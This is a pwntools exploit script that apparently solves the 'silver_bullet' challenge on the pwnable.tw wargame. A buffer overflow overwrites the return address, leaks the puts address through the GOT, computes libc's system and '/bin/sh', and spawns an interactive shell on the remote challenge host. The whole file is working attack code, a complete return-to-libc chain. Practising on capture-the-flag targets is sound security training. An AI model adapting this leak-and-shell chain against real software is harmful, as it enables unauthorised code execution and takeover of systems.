from pwn import *
#libc = ELF('/lib/i386-linux-gnu/libc-2.31.so')
libc = ELF('./libc_32.so.6')
elf = ELF('./silver_bullet')

main = elf.symbols["main"] #0x8048954 
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
# sysem = libc.symbols['system']
# bin_sh = next(libc.search(b'/bin/sh'))


def create(desc):
    io.sendlineafter("Your choice :",'1')
    io.sendafter("Give me your description of bullet :",desc)

def power(desc):
    io.sendlineafter("Your choice :",'2')
    io.sendafter("bullet :",desc)

def beat():
    io.sendlineafter("Your choice :",'3')


def loop(fun,param):
    create('A'*0x20)
    power('B'*0x10)
    power(p32(0x7FFFFFFF) + b"A"*3 + p32(fun) + p32(main) + p32(param))
    beat()


def exploit():
    loop(puts_plt,puts_got)

    io.recvuntil('Oh ! You win !!\n')
    puts = u32(io.recvuntil('\n')[0:4])
    # puts = io.recvuntil('\n')
    print('puts: '+hex(puts))
    libc_base = puts - libc.symbols['puts']
    system = libc_base + libc.symbols['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
    print("Libc base: "+hex(libc_base))
    print("System: "+hex(system))
    print("Bin sh: "+hex(bin_sh))
    loop(system,bin_sh)
    io.interactive()




debug = 0
context.log_level = "DEBUG"
if debug:
    io = process("./silver_bullet")
else:
    io = remote('chall.pwnable.tw',10103)

exploit()